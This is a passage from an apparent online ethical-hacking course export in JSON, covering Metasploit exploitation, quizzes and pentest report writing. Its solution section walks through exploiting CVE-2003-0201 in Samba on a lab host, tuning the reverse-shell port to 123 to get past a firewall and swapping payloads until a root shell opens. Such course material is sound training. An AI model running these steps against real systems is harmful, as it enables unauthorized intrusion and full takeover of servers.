+              "text": "5. Check the list of required options using the `show options` command\n```bash\nshow options\n```\n<br>\n6. To change an option, use `set \n<option> <option value>` command\n```bash\nset RHOSTS 10.10.10.10\nset LHOST 0.0.0.0\nset LPORT 123\n```\nWe are setting `LPORT` to `123` because that port is often left open \n<br><br>\n7. To check the exploitability, use the `check` command\n```bash\ncheck\n```\n<br>\n8. Use the`run` or `exploit` command to start the attack process.\n```bash\nrun\n```\n<br>\n9. If the exploit completes successfully but no session is created, try the following troubleshooting steps:\n   - run it a few more times (sometimes this works!)\n   - changing the `LPORT` \n  -  change the  payload\n```bash\nset payload windows/meterpreter/bind_tcp\nexploit\n```\n<br>\n10. When  Meterpreter shell is opened use the `help` command to learn what you can do on this machine\n```bash\nhelp\n```\n<br>\n11. Use the `shell`  command to open a system shell if needed\n```bash\nshell\n```\n<br>\n12. Run `ipconfig` to check the newly hacked machine's **IP Address**\n```bash\nipconfig\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1130297,
+              "key": "97a246db-bcfb-462d-bf44-8fb0451df9ad",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\n* To learn more about Meterpreter,  read this article from Offensive Security <a href=\"https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/#:~:text=Meterpreter%20is%20an%20advanced%2C%20dynamically,completion%2C%20channels%2C%20and%20more.\" target=\"_blank\">About The Metasploit Meterpreter</a>\n* There are many other payloads supported by Metasploit, You can read about them here: <a href=\"https://www.offensive-security.com/metasploit-unleashed/payload-types/\" target=\"_blank\">Payload Types in the Metasploit Framework</a>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089589,
+          "key": "262b29bb-a4dd-4e6c-adeb-484bbc9a5992",
+          "title": "Quizzes: Executing Exploits ",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "262b29bb-a4dd-4e6c-adeb-484bbc9a5992",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089586,
+              "key": "9adb3b40-1154-4b98-93fb-d5be125e5922",
+              "title": "Executing Exploits Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Executing Exploits",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089587,
+              "key": "e83b682c-6074-43af-8d58-15355ff217bf",
+              "title": "Executing Exploits Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "e83b682c-6074-43af-8d58-15355ff217bf",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Why do we use trusted sources for exploit codes?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Exploits can cause damage to CIA of the system ",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "It is illegal to use exploits which are not purchased on commercial exchanges",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1604073045845",
+                    "text": "Exploits that don't come from trusted sources are unlikely to work and will give us unreliable results",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089588,
+              "key": "6d732fd3-cf89-4860-b1e1-2c07d62f3bcc",
+              "title": "Executing Exploits Hard Quiz",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "6d732fd3-cf89-4860-b1e1-2c07d62f3bcc",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "What can you do if an exploit doesn't work?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Try changing your listening port",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Read the code and try to figure out how it works",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1604072664803",
+                    "text": "Research the error on the internet",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1604072687144",
+                    "text": "Retry the exploit few more times",
+                    "is_correct": true
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089593,
+          "key": "f68fd8ce-254b-4311-95bc-2f1b5b800056",
+          "title": "Exercise: Exploiting CVE-2003-0201",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "f68fd8ce-254b-4311-95bc-2f1b5b800056",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089590,
+              "key": "7d90a688-7d10-41ab-9f89-b726188f7ca7",
+              "title": "Exercise: Executing Exploits Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Exploiting CVE-2003-0201",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089591,
+              "key": "d2954696-9fca-441d-ae41-322056f6c7ba",
+              "title": "Exercise: Executing Exploits Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In the last exercise, we found that Samba 2.2.1a is vulnerable against CVE-2003-0201 and we found an exploit named **Trans2Open Overflow.**\n\nFor this exercise, we need to validate the vulnerability using Metasploit on your analyst machine. Be aware that:\n\n* The rules of assessment only allow the use of commercial exploits\n* A firewall is running on the system which only allows outbound connections to NTP (Network Time Protocol) servers on TCP",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089592,
+              "key": "6f6821c6-4338-45bf-8801-ac70a024d645",
+              "title": "Validating a Vulnerability",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "6f6821c6-4338-45bf-8801-ac70a024d645",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Load the correct module for **Trans2Open** vulnerability in Metasploit on your analyst machine",
+                "Tune the exploit considering the **firewall requirements**",
+                "Run the exploit and **validate** the vulnerability",
+                "Run `whoami`  which should return `root`",
+                "Run `host` which should return `testlab.example.com`"
+              ],
+              "positive_feedback": "Great job!  In the next video, you can see my solution.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089598,
+          "key": "8afcf24b-040e-47a1-b2f7-858806a5bb43",
+          "title": "Solution: Exploiting CVE-2003-0201",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "8afcf24b-040e-47a1-b2f7-858806a5bb43",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089594,
+              "key": "04b58b43-3a8f-403d-a7d8-b81a95989488",
+              "title": "Solution: Executing Exploits Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089595,
+              "key": "eb8b3142-db12-477f-be9c-beb7731c118e",
+              "title": "ND350 EHND C1 L2 A13 Solution Exploiting CVE 2003 0201 V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "j5d9F-xZarQ",
+                "china_cdn_id": "j5d9F-xZarQ.mp4"
+              }
+            },
+            {
+              "id": 1089596,
+              "key": "c85fe67b-f821-4f90-b4da-02b0de4e1e72",
+              "title": "Solution: Executing Exploits Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. Launch Metasploit Console \n```bash\nmsfconsole\n```\n<br>\n2. Search available exploits\n```bash\nsearch type:exploit trans2open\n```\n<br>\n3. Because the target is a Linux host, choose the **Linux based trans2open exploit** \n```bash\nuse exploit/linux/samba/trans2open\n```\n<br>\n4. Use the `show options` command to obtain further information and the parameter requirements. \n```bash\nshow options\n```\nThis tells us that `LHOST` and `LPORT` can be configured.  \nWe see that `LHOST` is already set to `10.10.10.7` which is the correct connection.\n<br><br>\n5. We know that the firewall on the server allows outbound connections on the NTP port. A quick internet search tells us that NTP runs on port `123` so we'll use the `set` command to tune the exploit to bypass the firewall requirements using port 123.\n```bash\nset LPORT 123\n```\n<br>\n6.  Run the  `show options` command again to confirm that `LHOST` and `LPORT` are correctly set.\n```bash\nshow options\n```\n<br>\n\n7. Run the exploit.\n```bash\nrun\n```\nAnd we get an error:  `Exploit failed: One or more options failed to validate: RHOSTS`\n<br><br>\n\n8.  Use the `set` command to set the `RHOSTS`\n```bash\nset RHOST 10.10.10.15\n```\n<br>\n\n9. Run the exploit again\n```bash\nrun\n```\nThis time we see that the Meterpreter session is opening and closing.  This means that the payload is not compatible with the exploit.  Use `CTRL-C` to cancel.<br><br>\n10.  Run `set payload` and then click `tab` twice to see the list of possible payloads.  Copy the exploit that uses a reverse payload on TCP and use the `set payload` command to set it. \n```bash\nset payload linux/x86/meterpreter/reverse_tcp\n```\nRun the exploit again:\n```\nrun\n```\nThe session is still dying!  Hit `CTRL-C` to stop it. \n<br><br>\n\n11.  The settings are correct so it is time to try a different payload type.   Instead of using `meterpreter` we can try  `shell` or `generic shell`.   We'll run `set payload` and hit `tab` again twice to see our options.  We'll copy the `generic shell`  option, and paste it after `set payload` to change the payload again.\n```bash\nset payload generic/shell_reverse_tcp\n```\nWe'll launch the exploit again with the `run`command: \n```bash\nrun\n```\nIt worked!  We see `Command shell session 9 opened`\n<br><br>\n12.  Next, we can run `whoami` and `hostname` to check our results:\n```bash\nwhoami\n```\nReturns `root` which tells me I have root access\n```bash\nhostname\n```\nReturns `testlab.example.com` which prove that we were successful in hacking the machine!",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089597,
+              "key": "e1ac966a-b3bc-496f-9022-5d12690654dc",
+              "title": "Thinking Like A Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "e1ac966a-b3bc-496f-9022-5d12690654dc",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "When do you think using a staged payload is a good idea?",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089605,
+          "key": "8c418785-5cf0-493d-abdc-1dc906693937",
+          "title": "Reporting Results",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "8c418785-5cf0-493d-abdc-1dc906693937",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089599,
+              "key": "16788b3d-39ec-4811-a887-b31c3a0478e3",
+              "title": "Reporting Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Sharing Your Findings in A Report",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089600,
+              "key": "76bc5b6e-9e80-4f7d-b93e-50f8c18e2ba3",
+              "title": "ND350 EHND C1 L2 A14 Writing Reports Part 1 V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "ejPhIYX4N4c",
+                "china_cdn_id": "ejPhIYX4N4c.mp4"
+              }
+            },
+            {
+              "id": 1127855,
+              "key": "9d774799-3d44-4b0d-9ca7-89407bb387e3",
+              "title": "Reporting Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Nine Must-Have Elements In An industry-Standard Report\n\n* Document Control \n* Legal Disclaimer\n* Table of Contents\n* Executive Summary\n* A Glance Through Target Security Posture\n* Testing Methodology\n* Tools & Websites Used \n* Detailed Technical Reports\n* Appendices\n\n### Document Control\n\nDocument Control is used to keep track of the document versions. This is necessary because a report often requires input from many different people: one person reports on automated testing, another person reports the results of manual tests, and another person checks the report formatting issues. All of this needs to be recorded. This information is also used when any retesting is done in the future.\n\n### Legal Disclaimer\n\nThe disclaimer should be written by your legal team to minimize any risk to the organization from incorrect information in the report\n\n### Table of Contents\n\nThe Table of Contents helps readers find the information they are looking for quickly by providing a page number for each section of the report. You might think it should be the first element in a report, but in the security industry, document control and disclaimer information are more important so they come first. \n\n### Executive Summary\n\nThe summary shares an overview of the audit results. It should include: \n\n* The context of the assessment\n* A high-level summary of the results\n* Observations made \n* Problems discovered\n* A proposed solution that is consistent with the organization's policies and procedures\n\nIt is also helpful to include a pie chart showing the number of vulnerabilities found for each level of risk rating.\n\n### Security Posture\n\nThe Security Posture includes a table of all of the important numbers:\n\n* The total number of vulnerabilities \n* The number of critical vulnerabilities\n* An overall security rating\n\nYou may also want to include a pie chart of the data.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127856,
+              "key": "68587ba5-531b-4c96-a489-e520b6c85fae",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## More Report Details",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127857,
+              "key": "2b88c8ab-9065-4c6d-bfcd-f03747e80e64",
+              "title": "ND350 EHND C1 L2 A14 Writing Reports Part 2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "pi1KLyI_JxE",
+                "china_cdn_id": "pi1KLyI_JxE.mp4"
+              }
+            },
+            {
+              "id": 1089601,
+              "key": "6ae6bd82-b9e8-46b9-a868-6b8f8ca36f6c",
+              "title": "Reporting Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Methodology And Tools\n\n#### Methodology\n\nThis section should follow the steps outlined in the Work Breakdown sheet of the test scope and should list all of the steps followed. If you don't have a test sope, follow the four-step process we covered earlier.\n\n#### Tools\n\nThis section should follow the Rules of Assessment from the test scope. It lists all of the allowed tools and sources. If you don't have a test scope, you should list all of the tools and websites you used to complete the test.\n\n### Detailed Technical Reports\n\nThere should be one report for each target in the test scope. \n\n#### Summary\n\nThe summary page should list the number of vulnerabilities found on that target. \n\n#### Technical Report\n\nThe Technical Report should include\n\n* A finding name with a risk rating\n* A description of the vulnerability (generally copied from CVE)\n* An Exposure/Analysis section where you share your professional judgment and observations., as well as any details about code modifications or chaining and risk score adjustments.\n* A recommendation for each vulnerability.\n\n### Appendices\n\nThe appendices should include any relevant additional information like screenshots, modified codes, vulnerability score analysis, etc.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122399,
+              "key": "6df6bbe4-470f-4144-8e42-1b7ab7c28a5d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Security Report Template\n\nDownload here:  <a href=\"https://video.udacity-data.com/topher/2020/December/5fda6fda_project-report-template-12-15-20/project-report-template-12-15-20.docx\" target=\"_blank\">Security Report Template</a>. \n\nThe template is a `.docx` format that can be opened using most popular word-processing systems, including Microsoft Word and Google Docs.  To use the worksheet in Google Docs:\n\n1. Upload the document to your Google Drive\n1. Click **Open with Google Docs** at the top of the screen",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122947,
+              "key": "0439db5e-069d-4670-be3f-6a86071f2f13",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nWe have been focusing on writing reports for an internal audience.  Reports from third-party service providers are a little different.  See this article from Infosec to learn more:   <a href=\"https://resources.infosecinstitute.com/topic/writing-penetration-testing-reports/\" target=\"_blank\">The Art of Writing Penetration Test Reports</a>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1105952,
+          "key": "c389083c-2a3b-4ef6-ba37-e438bca26e75",
+          "title": "Quizzes: Reporting Results",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "c389083c-2a3b-4ef6-ba37-e438bca26e75",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1123826,
+              "key": "ca2e3901-6dc2-42e1-a879-769829861bc0",
+              "title": "Report Writing Hard Question",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "ca2e3901-6dc2-42e1-a879-769829861bc0",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "True or False: The overall security rating in the Security Posture is subjective whereas the risk rating in the Detailed Technical Report is objective in nature.",
+                "answers": [
+                  {
+                    "id": "a1609949545940",
+                    "text": "True",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1609949565567",
+                    "text": "False",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1124061,
+              "key": "54e93bb7-8d42-47dd-ac89-fb7b40d5e06a",
+              "title": "Report Writing Easy Quiz",
+              "semantic_type": "MatchingQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "54e93bb7-8d42-47dd-ac89-fb7b40d5e06a",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "complex_prompt": {
+                  "text": "Match the report section with the information found in that section"
+                },
+                "concepts_label": "Report section",
+                "answers_label": "Information ",
+                "concepts": [
+                  {
+                    "text": "Executive Summary",
+                    "correct_answer": {
+                      "id": "a1609999348450",
+                      "text": "The context of the assessment"
+                    }
+                  },
+                  {
+                    "text": "Security Posture",
+                    "correct_answer": {
+                      "id": "a1609999441780",
+                      "text": "An overall summary of the organization's security"
+                    }
+                  },
+                  {
+                    "text": "Steps To Reproduce",
+                    "correct_answer": {
+                      "id": "a1609999443754",
+                      "text": "Technical guidance for the Blue Team"
+                    }
+                  },
+                  {
+                    "text": "Appendix",
+                    "correct_answer": {
+                      "id": "a1609999444986",
+                      "text": "Additional information for stakeholders"
+                    }
+                  }
+                ],
+                "answers": [
+                  {
+                    "id": "a1609999443754",
+                    "text": "Technical guidance for the Blue Team"
+                  },
+                  {
+                    "id": "a1609999441780",
+                    "text": "An overall summary of the organization's security"
+                  },
+                  {
+                    "id": "a1609999444986",
+                    "text": "Additional information for stakeholders"
+                  },
+                  {
+                    "id": "a1610001770695",
+                    "text": "CVSS score calculations"
+                  },
+                  {
+                    "id": "a1609999348450",
+                    "text": "The context of the assessment"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1105953,
+          "key": "c69cb0f9-a986-4aea-bf45-83459004a4dd",
+          "title": "Exercise: Technical Report",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "c69cb0f9-a986-4aea-bf45-83459004a4dd",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "TestLab Technical Report Template",
+                "uri": "https://video.udacity-data.com/topher/2021/January/6001a899_test-lab-report-template/test-lab-report-template.docx"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1123237,
+              "key": "138d18bb-6023-4b8a-b6c0-16900448b94e",
+              "title": "Exercise: Executing Exploits Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Report On Testlab",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1123236,
+              "key": "c620ef7a-a247-4e96-914b-eda319b1b822",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Based on your findings from the earlier exercises in this lesson, write the Detailed Technical Report section of the security audit report.\n\nWrite the report using the provided template: <a href=\"https://video.udacity-data.com/topher/2021/January/6001a899_test-lab-report-template/test-lab-report-template.docx\" target=\"_blank\">Security Report Template</a>.\n\nThe template is a `.docx` format that can be opened using most popular word-processing systems, including Microsoft Word and Google Docs.  To use the worksheet in Google Docs:\n\n1. Upload the document to your Google Drive\n1. Click **Open with Google Docs** at the top of the screen",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123238,
+              "key": "4e8b85e5-7cc0-4b13-b0f4-e46d83349276",
+              "title": "Write the Detailed Technical Report section of a security audit report",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "4e8b85e5-7cc0-4b13-b0f4-e46d83349276",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Download the report template (see link at the bottom of the page)",
+                "Write a description analysis, and recommendation based on your findings and give it the title **Remote buffer overflow**",
+                "Write the **Steps to Reproduce** section and include screenshots",
+                "Create the **Summary of The target** page"
+              ],
+              "positive_feedback": "Great job!  In the next video, you can see my solution.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1105954,
+          "key": "9504e29a-304b-48ac-8833-b9e6336bd353",
+          "title": "Solution: Technical Report",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "9504e29a-304b-48ac-8833-b9e6336bd353",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "Report on TestLab Solution",
+                "uri": "https://video.udacity-data.com/topher/2021/January/6001a638_report-exercise-solution/report-exercise-solution.pdf"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1123239,
+              "key": "160def63-efc8-4336-be7d-fbb91814ae9a",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Report On Testlab",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123240,
+              "key": "a3617f3f-e105-4292-89f4-1ad47f11ceed",
+              "title": "ND350 EHND C1 L2 A15 Report On TestLab",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "cvyxiAVyiY0",
+                "china_cdn_id": "cvyxiAVyiY0.mp4"
+              }
+            },
+            {
+              "id": 1123682,
+              "key": "a29a84b2-a186-4e87-883e-451ff615dcb8",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Detailed Technical Reports",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123463,
+              "key": "d5fcecac-ba88-4c63-a5c3-729928a17fd3",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff402fc_graph/graph.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/d5fcecac-ba88-4c63-a5c3-729928a17fd3",
+              "caption": "                                   **Summary of Target**",
+              "alt": null,
+              "width": 649,
+              "height": 509,
+              "instructor_notes": null
+            },
+            {
+              "id": 1123469,
+              "key": "e7746b46-ee45-4c68-98a0-f2bc6c3a4bbb",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Finding 1: Remote Buffer Overflow – `CRITICAL`\n\n### Vulnerability Description:\n\nBuffer overflow in the call_trans2open function in trans2.c for Samba 2.2.x before 2.2.8a, 2.0.10 and earlier 2.0.x versions, and Samba-TNG before 0.3.2, allows remote attackers to execute arbitrary code.\n\n### Exposure/Analysis:\n\nThe target is running this service as the Root User hence this is extremely dangerous. If exploited successfully, will give complete privileged control over the server.\n\nIt should be noted that the default Meterpreter payload doen’t works and needs to be changed to a generic shell payload for the exploit to work successfully.\n\n### Recommendations:\n\nUpgrade Samba to a secure release – Latest version available is Samba 4.13.x",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123671,
+              "key": "6408aaad-145a-42d9-b355-ce151784ea57",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Steps to Reproduce\n\n1. **Initial Nmap Scan** Reveals many ports, protocols and services.\n   * Command Used – `nmap 10.10.10.15 -p0-65535 -sV`",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123672,
+              "key": "f874766b-45a7-4a3f-a4b3-4b26ceb5547d",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff52b1e_nmap-scan/nmap-scan.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/f874766b-45a7-4a3f-a4b3-4b26ceb5547d",
+              "caption": null,
+              "alt": null,
+              "width": 1245,
+              "height": 454,
+              "instructor_notes": null
+            },
+            {
+              "id": 1123674,
+              "key": "da91e1c6-83d0-4be5-b1f3-b6c9489edb9a",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "2. The **exact numeric version for Samba** was Discovered using Metasploit\n\n   * Metasploit Module Utilized - `auxiliary/scanner/smb/smb_version`",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123675,
+              "key": "c56100a7-5002-4f4e-b656-6042b909d318",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff52be4_metasploit/metasploit.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/c56100a7-5002-4f4e-b656-6042b909d318",
+              "caption": null,
+              "alt": null,
+              "width": 1332,
+              "height": 607,
+              "instructor_notes": null
+            },
+            {
+              "id": 1123676,
+              "key": "4b46c759-2a14-4173-9f3b-137457ccf396",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "3. Research on Samba 2.2.1a discovered **a score-10 CVE-2003-0201** and 4 Potential Exploits.\n\n   * CVE Reference Page - <a href=\"https://www.cvedetails.com/cve/CVE-2003-0201/\" target=\"_blank\">**https://www.cvedetails.com/cve/CVE-2003-0201/**</a>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123677,
+              "key": "826f0a47-f1a7-4b2b-9386-1144f32f66c0",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff52ce4_cve-newly/cve-newly.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/826f0a47-f1a7-4b2b-9386-1144f32f66c0",
+              "caption": null,
+              "alt": null,
+              "width": 1116,
+              "height": 440,
+              "instructor_notes": null
+            },
+            {
+              "id": 1123678,
+              "key": "bb5bdedc-3b0e-40d3-ad1a-427377479960",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff52d42_repo-pic-1/repo-pic-1.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/bb5bdedc-3b0e-40d3-ad1a-427377479960",
+              "caption": null,
+              "alt": null,
+              "width": 703,
+              "height": 341,
+              "instructor_notes": null
+            },
+            {
+              "id": 1123679,
+              "key": "ef2c12af-f7f9-4b68-84e9-aca84d233eaf",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "4. **Exploit validated** with given options.\n\n   * Metasploit Module Reference – <a href=\"https://rapid7.com/db/modules/exploit/linux/samba/trans2open/\" target=\"_blank\">**https://rapid7.com/db/modules/exploit/linux/samba/trans2open/**</a>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123680,
+              "key": "e75dc419-04fe-42c5-91bc-564b1dd32cd4",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/5ff52ddf_exploit-new/exploit-new.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/e75dc419-04fe-42c5-91bc-564b1dd32cd4",
+              "caption": null,
+              "alt": null,
+              "width": 1236,
+              "height": 644,
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089626,
+          "key": "fae32948-095b-49c8-9329-cacff0a6e36b",
+          "title": "Buggy Exploits",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "fae32948-095b-49c8-9329-cacff0a6e36b",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1127996,
+              "key": "02d6c522-584f-4204-b357-83398d911c2b",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Help! My Exploit Code Isn't Working",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1123300,
+              "key": "21066c08-f032-4233-8790-1c64864ad27d",
+              "title": "",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "21066c08-f032-4233-8790-1c64864ad27d",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "True or False: If a public exploit code is not working even after trying all possible input parameters, we can mark the system as safe",
+                "answers": [
+                  {
+                    "id": "edcb4339-bc78-451c-85b5-d3a383acad69",
+                    "text": "True",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1610017370436",
+                    "text": "False",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089621,
+              "key": "d05c1d8b-201e-4ffe-ae06-68e012bcc22d",
+              "title": "ND350 EHND C1 L2 A16 Buggy Exploits V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "3WggpoPNLa8",
+                "china_cdn_id": "3WggpoPNLa8.mp4"
+              }
+            },
+            {
+              "id": 1089622,
+              "key": "4bf075ea-bc73-44ad-816e-c66f627a7449",
+              "title": "Every Case is Different Text",
+              "semantic_type": "TextAtom",
+              "is_public": true,
